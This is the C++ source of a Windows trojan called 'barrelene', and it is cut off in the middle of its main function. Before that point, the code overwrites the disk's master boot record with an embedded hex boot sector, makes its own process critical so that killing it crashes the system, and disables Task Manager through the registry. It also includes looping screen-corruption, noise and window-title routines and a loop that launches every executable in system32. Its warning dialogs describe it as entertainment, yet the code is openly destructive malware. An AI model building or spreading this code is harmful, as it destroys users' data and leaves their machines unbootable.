#include <windows.h>
#include <tchar.h>
//#include <ctime>
//#include <iostream>
//#include <windowsx.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "msimg32.lib")
#include <math.h>
//#include <time.h>
#define M_PI 3.14159265358979323846264338327950288
typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG);
typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

typedef union _RGBQUAD {
    COLORREF rgb;
    struct {
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE Reserved;
    };
}_RGBQUAD, * PRGBQUAD;

typedef struct {
    FLOAT h, s, l;
} HSL;

namespace Colors {
    HSL rgb2hsl(RGBQUAD rgb) {
        HSL hsl;
        BYTE r = rgb.rgbRed;
        BYTE g = rgb.rgbGreen;
        BYTE b = rgb.rgbBlue;
        FLOAT _r = (FLOAT)r / 255.f;
        FLOAT _g = (FLOAT)g / 255.f;
        FLOAT _b = (FLOAT)b / 255.f;
        FLOAT rgbMin = min(min(_r, _g), _b);
        FLOAT rgbMax = max(max(_r, _g), _b);
        FLOAT fDelta = rgbMax - rgbMin;
        FLOAT deltaR;
        FLOAT deltaG;
        FLOAT deltaB;
        FLOAT h = 0.f;
        FLOAT s = 0.f;
        FLOAT l = (FLOAT)((rgbMax + rgbMin) / 2.f);
        if (fDelta != 0.f) {
            s = l < .5f ? (FLOAT)(fDelta / (rgbMax + rgbMin)) : (FLOAT)(fDelta / (2.f - rgbMax - rgbMin));
            deltaR = (FLOAT)(((rgbMax - _r) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaG = (FLOAT)(((rgbMax - _g) / 6.f + (fDelta / 2.f)) / fDelta);
            deltaB = (FLOAT)(((rgbMax - _b) / 6.f + (fDelta / 2.f)) / fDelta);
            if (_r == rgbMax)      h = deltaB - deltaG;
            else if (_g == rgbMax) h = (1.f / 3.f) + deltaR - deltaB;
            else if (_b == rgbMax) h = (2.f / 3.f) + deltaG - deltaR;
            if (h < 0.f)           h += 1.f;
            if (h > 1.f)           h -= 1.f;
        }
        hsl.h = h; hsl.s = s; hsl.l = l;
        return hsl;
    }

    RGBQUAD hsl2rgb(HSL hsl) {
        RGBQUAD rgb;
        FLOAT r = hsl.l;
        FLOAT g = hsl.l;
        FLOAT b = hsl.l;
        FLOAT h = hsl.h;
        FLOAT sl = hsl.s;
        FLOAT l = hsl.l;
        FLOAT v = (l <= .5f) ? (l * (1.f + sl)) : (l + sl - l * sl);
        FLOAT m;
        FLOAT sv;
        FLOAT fract;
        FLOAT vsf;
        FLOAT mid1;
        FLOAT mid2;
        INT sextant;
        if (v > 0.f) {
            m = l + l - v;
            sv = (v - m) / v;
            h *= 6.f;
            sextant = (INT)h;
            fract = h - sextant;
            vsf = v * sv * fract;
            mid1 = m + vsf;
            mid2 = v - vsf;
            switch (sextant) {
            case 0:
                r = v; g = mid1; b = m;
                break;
            case 1:
                r = mid2; g = v; b = m;
                break;
            case 2:
                r = m; g = v; b = mid1;
                break;
            case 3:
                r = m; g = mid2; b = v;
                break;
            case 4:
                r = mid1; g = m; b = v;
                break;
            case 5:
                r = v; g = m; b = mid2;
                break;
            }
        }
        rgb.rgbRed = (BYTE)(r * 255.f);
        rgb.rgbGreen = (BYTE)(g * 255.f);
        rgb.rgbBlue = (BYTE)(b * 255.f);
        return rgb;
    }
}

int red, green, blue;
bool ifcolorblue = false, ifblue = false;
COLORREF Hue(int length) {
    if (red != length) {
        red < length; red++;
        if (ifblue == true) {
            return RGB(red, 0, length);
        }
        else {
            return RGB(red, 0, 0);
        }
    }
    else {
        if (green != length) {
            green < length; green++;
            return RGB(length, green, 0);
        }
        else {
            if (blue != length) {
                blue < length; blue++;
                return RGB(0, length, blue);
            }
            else {
                red = 0; green = 0; blue = 0;
                ifblue = true;
            }
        }
    }
}

COLORREF RndRGB() {
    int clr = rand() % 5;
    if (clr == 0) return RGB(255, 0, 0);
    if (clr == 1) return RGB(0, 255, 0);
    if (clr == 2) return RGB(0, 0, 255);
    if (clr == 3) return RGB(255, 0, 255);
    if (clr == 4) return RGB(255, 255, 0);
}

LPCWSTR string() {
    srand(GetTickCount());
    WCHAR string[32];
    for (int i = 0; i < 32; i++) {
        string[i] = (WCHAR)(rand() % 256) + 1;
    }
    return string;
}

const unsigned char MasterBootRecord[] = {
0x31, 0xDB, 0x8E, 0xDB, 0xBC, 0x00, 0x7C, 0xDB, 0xE3, 0xB8, 0x13, 0x00, 0xCD, 0x10, 0x31, 0xC0, 0x8E,
0xC0, 0xBF, 0x00, 0x7E, 0xB9, 0x00, 0x02, 0xF3, 0xAA, 0xFF, 0x06, 0x20, 0x7E, 0xD9, 0x06, 0x00, 0x7E, 0xD8,
0x06, 0xD7, 0x7D, 0xD9, 0x16, 0x00, 0x7E, 0xD9, 0xFB, 0xD9, 0x1E, 0x08, 0x7E, 0xD9, 0x1E, 0x04, 0x7E, 0xD9,
0x06, 0xD3, 0x7D, 0xD8, 0x06, 0xD7, 0x7D, 0xD9, 0x16, 0xD3, 0x7D, 0xD9, 0xFB, 0xD9, 0x1E, 0x10, 0x7E, 0xD9,
0x1E, 0x0C, 0x7E, 0xBB, 0x00, 0x30, 0xB0, 0x7F, 0x8E, 0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0x30, 0xC0,
0xBB, 0x00, 0x20, 0x8E, 0xC3, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xAA, 0xBB, 0xCF, 0xFF, 0xD9, 0x06, 0x00, 0x7E,
0xD9, 0xFE, 0xD8, 0x0E, 0xDB, 0x7D, 0xDF, 0x1E, 0x22, 0x7E, 0x8B, 0x0E, 0x22, 0x7E, 0x83, 0xC1, 0x32, 0xBD, 0x63,
0x00, 0xB8, 0x16, 0xFE, 0xBA, 0xDE, 0x03, 0xBE, 0x04, 0x00, 0xE8, 0x3D, 0x00, 0x87, 0xD9, 0xF7, 0xDB, 0x4E, 0x75,
0xF6, 0xBE, 0x05, 0x00, 0x91, 0xF7, 0xD9, 0xE8, 0x2D, 0x00, 0xBE, 0x06, 0x00, 0xF7, 0xD8, 0xF7, 0xD9, 0xE8, 0x23,
0x00, 0x91, 0xF7, 0xD9, 0x40, 0x4A, 0x75, 0xD9, 0x43, 0x4D, 0x75, 0xCF, 0x1E, 0xB8, 0x00, 0x20, 0x8E, 0xD8, 0xB8,
0x00, 0xA0, 0x8E, 0xC0, 0x31, 0xF6, 0x31, 0xFF, 0xB9, 0x00, 0xFA, 0xF3, 0xA4, 0x1F, 0xE9, 0x50, 0xFF, 0x66, 0x60, 0xA3,
0x14, 0x7E, 0x89, 0x1E, 0x18, 0x7E, 0x89, 0x0E, 0x1C, 0x7E, 0xDF, 0x06, 0x14, 0x7E, 0xD9, 0x1E, 0x14, 0x7E, 0xDF, 0x06,
0x18, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDF, 0x06, 0x1C, 0x7E, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x06, 0x04, 0x7E, 0xD9, 0x06,
0x08, 0x7E, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 0x06, 0x18, 0x7E,
0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xC1, 0xD9, 0x1E, 0x1C, 0x7E, 0xD9, 0x1E, 0x18, 0x7E, 0xDD, 0xD8,
0xDD, 0xD8, 0xD9, 0x06, 0x0C, 0x7E, 0xD9, 0x06, 0x10, 0x7E, 0xD9, 0x06, 0x14, 0x7E, 0xD8, 0xC9, 0xD9, 0x06, 0x1C, 0x7E, 0xD8,
0xCB, 0xDE, 0xC1, 0xD9, 0x06, 0x14, 0x7E, 0xD8, 0xCB, 0xD9, 0x06, 0x1C, 0x7E, 0xD8, 0xCB, 0xDE, 0xE9, 0xD9, 0xC0, 0xD8, 0x0E,
0xCB, 0x7D, 0xDF, 0x1E, 0x1C, 0x7E, 0xD8, 0x06, 0xC7, 0x7D, 0xD9, 0x06, 0x18, 0x7E, 0xD8, 0xF1, 0xD8, 0x0E, 0xCF, 0x7D, 0xDF,
0x1E, 0x18, 0x7E, 0xDE, 0xF9, 0xD8, 0x0E, 0xCF, 0x7D, 0xDF, 0x1E, 0x14, 0x7E, 0xDD, 0xD8, 0xDD, 0xD8, 0x8B, 0x3E, 0x20, 0x7E,
0xC1, 0xEF, 0x04, 0x01, 0xFE, 0x83, 0xE6, 0x0F, 0x8A, 0x9C, 0xDF, 0x7D, 0x8B, 0x36, 0x14, 0x7E, 0x8B, 0x3E, 0x18, 0x7E, 0x81,
0xC6, 0xA0, 0x00, 0x83, 0xC7, 0x64, 0x81, 0xFE, 0x40, 0x01, 0x7D, 0x2C, 0x85, 0xF6, 0x78, 0x28, 0x81, 0xFF, 0xC8, 0x00, 0x7D,
0x22, 0x85, 0xFF, 0x78, 0x1E, 0x69, 0xFF, 0x40, 0x01, 0x01, 0xF7, 0xB9, 0x00, 0x30, 0xBE, 0x00, 0x20, 0xA0, 0x1C, 0x7E, 0x8E,
0xC1, 0x26, 0x3A, 0x05, 0x7D, 0x08, 0x26, 0x88, 0x05, 0x8E, 0xC6, 0x26, 0x88, 0x1D, 0x8E, 0xC6, 0x66, 0x61, 0xC3, 0x00, 0x00,
0x00, 0x40, 0x00, 0x00, 0x96, 0x43, 0x9A, 0x99, 0x99, 0x3F, 0x00, 0x00, 0x20, 0x43, 0x00, 0x00, 0x00, 0x40, 0x0A, 0xD7, 0xA3, 0x3B,
0x00, 0x00, 0x70, 0x41, 0x20, 0x22, 0x23, 0x25, 0x26, 0x27, 0x28, 0x2A, 0x2C, 0x2D, 0x2F, 0x30, 0x32, 0x34, 0x36, 0x37, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

DWORD WINAPI mbr(LPVOID lpParam) {
    DWORD Bytes;
    HANDLE hFile = CreateFileA(
        "\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
        OPEN_EXISTING, NULL, NULL);
    WriteFile(hFile, MasterBootRecord, 512, &Bytes, NULL);
    return 1;
}

void RegAdd(HKEY HKey, LPCWSTR Subkey, LPCWSTR ValueName, unsigned long Type, unsigned int Value) { //credits to Mist0090
    HKEY hKey;
    DWORD dwDisposition;
    LONG result;
    result = RegCreateKeyExW(HKey, Subkey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
    result = RegSetValueExW(hKey, ValueName, 0, Type, (const unsigned char*)&Value, (int)sizeof(Value));
    RegCloseKey(hKey);
    return;
}

typedef VOID(_stdcall* RtlSetProcessIsCritical) (
    IN BOOLEAN        NewValue,
    OUT PBOOLEAN OldValue,
    IN BOOLEAN     IsWinlogon);

BOOL EnablePriv(LPCWSTR lpszPriv) { //enable Privilege
    HANDLE hToken;
    LUID luid;
    TOKEN_PRIVILEGES tkprivs;
    ZeroMemory(&tkprivs, sizeof(tkprivs));
    if (!OpenProcessToken(GetCurrentProcess(), (TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))
        return FALSE;
    if (!LookupPrivilegeValue(NULL, lpszPriv, &luid)) {
        CloseHandle(hToken); return FALSE;
    }
    tkprivs.PrivilegeCount = 1;
    tkprivs.Privileges[0].Luid = luid;
    tkprivs.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL bRet = AdjustTokenPrivileges(hToken, FALSE, &tkprivs, sizeof(tkprivs), NULL, NULL);
    CloseHandle(hToken);
    return bRet;
}

BOOL ProcessIsCritical() {
    HANDLE hDLL;
    RtlSetProcessIsCritical fSetCritical;
    hDLL = LoadLibraryA("ntdll.dll");
    if (hDLL != NULL) {
        EnablePriv(SE_DEBUG_NAME);
        (fSetCritical) = (RtlSetProcessIsCritical)GetProcAddress((HINSTANCE)hDLL, "RtlSetProcessIsCritical");
        if (!fSetCritical) return 0;
        fSetCritical(1, 0, 0);
        return 1;
    }
    else
        return 0;
}

DWORD WINAPI shader1(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (x / 2) ^ 2 - y;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI question(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        DrawIconEx(hdc, rand() % x, rand() % y, LoadIcon(0, IDI_QUESTION), (rand() % 5 + 1) * GetSystemMetrics(11), (rand() % 5 + 1) * GetSystemMetrics(12), 0, NULL, DI_NORMAL);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI blur(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    BLENDFUNCTION blur;
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    bmp = CreateDIBSection(hdc, &bmpi, 0, 0, NULL, 0);
    SelectObject(hdcCopy, bmp);
    blur.BlendOp = AC_SRC_OVER;
    blur.BlendFlags = 0;
    blur.AlphaFormat = 0;
    blur.SourceConstantAlpha = 10;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 10, w, h - 20, hdc, 0, 0, w, h, SRCERASE);
        AlphaBlend(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, blur);
        ReleaseDC(0, hdc);
    }
    return 0x00;
}

DWORD WINAPI invcc(LPVOID lpParam) {
    int sx = 1, sy = 1, sx1 = 1, sy1 = 1;
    int incrementation = 10;
    int x = 10, y = 10;
    while (true) {
        HDC hdc = GetDC(0);
        x += incrementation * sx;
        y += incrementation * sy;
        HRGN circle = CreateEllipticRgn(x, y, x + 100, y + 100);
        InvertRgn(hdc, circle);
        if (y >= GetSystemMetrics(1)) {
            sy = -1;
        }
        if (x >= GetSystemMetrics(0)) {
            sx = -1;
        }
        if (y == 0) {
            sy = 1;
        }
        if (x == 0) {
            sx = 1;
        }
        DeleteObject(circle);
        ReleaseDC(0, hdc);
        Sleep(10);
    }
}

DWORD WINAPI shader2(LPVOID lpParam) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = screenWidth;
    bmpi.bmiHeader.biHeight = screenHeight;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, screenWidth, screenHeight, hdc, 0, 0, screenWidth, screenHeight, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < screenWidth; x++) {
            for (int y = 0; y < screenHeight; y++) {
                int index = y * screenWidth + x;
                int fx = (y ^ 2 - 4 + x + i) / 2 + x;
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 400.f + y / screenHeight * .2f, 1.f);
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, screenWidth, screenHeight, hdcCopy, 0, 0, screenWidth, screenHeight, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI textout(LPVOID lpParam) {
    while (true) {
        HDC hdc = GetDC(0);
        SetBkMode(hdc, 0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HFONT hfnt = CreateFontA(rand() % 100, rand() % 100, 0, 0, FW_THIN, 0, 0, 0, ANSI_CHARSET, 0, 0, 0, 0, "Fredoka");
        SelectObject(hdc, hfnt);
        LPCSTR things[] = {
            "barrelene", "you asked for it", "the law is harsh, but it's the law.",
            "N17Pro3426", "you won't be forgiven"
        };
        int thing = rand() % _countof(things);
        SetTextColor(hdc, Hue(239));
        TextOutA(hdc, rand() % w, rand() % h, things[thing], strlen(things[thing]));
        DeleteObject(hfnt);
        ReleaseDC(0, hdc);
        Sleep(100);
    }
}

DWORD WINAPI hell1(LPVOID lpParam) {
    int angle = 0;
    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(0);
        int y = GetSystemMetrics(1);
        int a = 100 * sin(M_PI + angle);
        int b = 20 * sin(M_PI + angle);
        BitBlt(hdc, a, b, x, y, hdc, 0, 0, NOTSRCERASE);
        DeleteDC(hdc);
        angle += 1;
        ReleaseDC(0, hdc);
        if (rand() % 10 == 5) InvalidateRect(0, 0, 0);
    }
}

DWORD WINAPI radius(LPVOID lpParam) {
    int cx = 600, cy = 400, radius = 400;
    float angle = 0;
    while (true) {
        HDC hdc = GetDC(0);
        int x = cx + static_cast<int>(radius * cos(angle * M_PI / 180));
        int y = cy + static_cast<int>(radius * sin(angle * M_PI / 180));
        HBRUSH brush = CreateSolidBrush(Hue(239));
        SelectObject(hdc, brush);
        RoundRect(hdc, x - 40, y - 40, x + 40, y + 40, x / 2, y / 2);
        angle += 1;
        Sleep(10);
        DeleteObject(brush);
        ReleaseDC(0, hdc);
    };
}

DWORD WINAPI shader3(LPVOID lpvd) {
    HDC hdc = GetDC(NULL);
    HDC hdcCopy = CreateCompatibleDC(hdc);
    int w = GetSystemMetrics(0);
    int h = GetSystemMetrics(1);
    BITMAPINFO bmpi = { 0 };
    HBITMAP bmp;
    bmpi.bmiHeader.biSize = sizeof(bmpi);
    bmpi.bmiHeader.biWidth = w;
    bmpi.bmiHeader.biHeight = h;
    bmpi.bmiHeader.biPlanes = 1;
    bmpi.bmiHeader.biBitCount = 32;
    bmpi.bmiHeader.biCompression = BI_RGB;
    RGBQUAD* rgbquad = NULL;
    HSL hslcolor;
    bmp = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
    SelectObject(hdcCopy, bmp);
    INT i = 0;
    while (true) {
        hdc = GetDC(NULL);
        StretchBlt(hdcCopy, 0, 0, w, h, hdc, 0, 0, w, h, SRCCOPY);
        RGBQUAD rgbquadCopy;
        for (int x = 0; x < w; x++) {
            for (int y = 0; y < h; y++) {
                int index = y * w + x;
                int fx = (int)((i * 4) * cbrt((y + (i * 4) ^ x)));
                rgbquadCopy = rgbquad[index];
                hslcolor = Colors::rgb2hsl(rgbquadCopy);
                hslcolor.h = fmod(fx / 300.f + y / h * .1f + i / 1000.f, 1.f);
                hslcolor.s = 0.7f;
                hslcolor.l = 0.5f;
                rgbquad[index] = Colors::hsl2rgb(hslcolor);
            }
        }
        i++;
        StretchBlt(hdc, 0, 0, w, h, hdcCopy, 0, 0, w, h, SRCCOPY);
        ReleaseDC(NULL, hdc);
        DeleteDC(hdc);
    }
    return 0x00;
}

DWORD WINAPI darker(LPVOID lpParam) {
    double angle = 0.0;
    while (1) {
        HDC hdc = GetDC(0);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        int xadd = cos(angle) * 10;
        int yadd = sin(angle) * 10;
        BitBlt(hdc, xadd, yadd, w, h, hdc, 0, 0, SRCAND);
        angle += M_PI / 8;
        ReleaseDC(0, hdc);
    }
}

DWORD WINAPI shader4(LPVOID lpParam) {
    HDC hdcScreen = GetDC(0), hdcMem = CreateCompatibleDC(hdcScreen);
    INT w = GetSystemMetrics(0), h = GetSystemMetrics(1);
    BITMAPINFO bmi = { 0 };
    PRGBQUAD rgbScreen = { 0 };
    bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biWidth = w;
    bmi.bmiHeader.biHeight = h;
    HBITMAP hbmTemp = CreateDIBSection(hdcScreen, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
    SelectObject(hdcMem, hbmTemp);
    for (;;) {
        hdcScreen = GetDC(0);
        BitBlt(hdcMem, 0, 0, w, h, hdcScreen, 0, 0, SRCCOPY);
        for (INT i = 0; i < w * h; i++) {
            INT x = i % w, y = i / w;
            rgbScreen[i].rgb = (rand() % 256) * 65793;
        }
        BitBlt(hdcScreen, 0, 0, w, h, hdcMem, 0, 0, SRCCOPY);
        ReleaseDC(NULL, hdcScreen); DeleteDC(hdcScreen);
    }
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 16000, 16000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[16000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(430 * (t >> 11 | t >> 1));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t >> 7 | t | t >> 6) * 10 + 4 * (t & t >> 4 | t >> 6);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 22050, 22050, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[22050 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t & 16384 ? 6 : 5) / 4 | t >> 4) * (1 + (3 & t >> 11)) >> (3 & t >> 9) | t * (t & 16384 ? 6 : 5) * (3 + (3 & t >> (t & 2048 ? 334 : 14))) >> 1 + (3 & t >> 8) & (t * t | t >> 4 | t >> 3);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t & t * (t >> ((t >> 6) & 12)));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        if (-t != 0) buffer[t] = static_cast<char>((t ^ 4 & 244) >> t / ((t >> 14 & 3) + 4));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}

DWORD WINAPI beep(LPVOID lpParam) {
    while (true) {
        Beep(rand() % 2400, rand() % 255);
    }
}

DWORD WINAPI opener(LPVOID lpParam) {
    WIN32_FIND_DATA data;
    LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";
    while (true) {
        HANDLE find = FindFirstFileW(path, &data);
        ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
        while (FindNextFileW(find, &data)) {
            ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
            Sleep(1000);
        }
    }
}

DWORD WINAPI textz(LPVOID lpParam) {
    const char* alphanum[] = {
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "q", "w", "e", "r", "t",
        "y", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "z",
        "x", "c", "v", "b", "n", "m", "Q", "W", "E", "R", "T", "Y", "U", "I", "O",
        "P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Z", "X", "C", "V", "B",
        "N", "M", ".", ",", " ", "$", "#", "&", "@", "!", "?",
    };
    int nText = sizeof(alphanum) / sizeof(void*);
    char text[1];
    while (true) {
        for (int i = 0; i < 70; i++) {
            text[i] = rand() % nText;
        }
        SetWindowTextA(GetForegroundWindow(), text);
        Sleep(10);
    }
}

int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d) {
    if (MessageBoxW(NULL, L"Warning! You have ran a trojan known as barrelene that has full capacity to delete all of your data and your operating system. By continuing, you keep in mind that the creator will not be responsible for any damage caused by this trojan and it's highly recommended that you run this in a testing virtual machine where a snapshot has been made before execution for the sake of entertainment and analysis. Are you sure you want to run this?", L"barrelene", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
        ExitProcess(0);
    }
    else {
        if (MessageBoxW(NULL, L"Final warning! This trojan has a lot of destructive potential. You will lose all of your data if you continue and the creator will not be responsible for any of the damage caused. This is not meant to be malicious, but simply for entertainment and educational purposes. Are you sure you want to continue? This is your final chance to stop this program from execution.", L"barrelene", MB_YESNO | MB_ICONEXCLAMATION) == IDNO) {
            ExitProcess(0);
        }
        else {
            ProcessIsCritical();
            CreateThread(0, 0, mbr, 0, 0, 0);
            RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
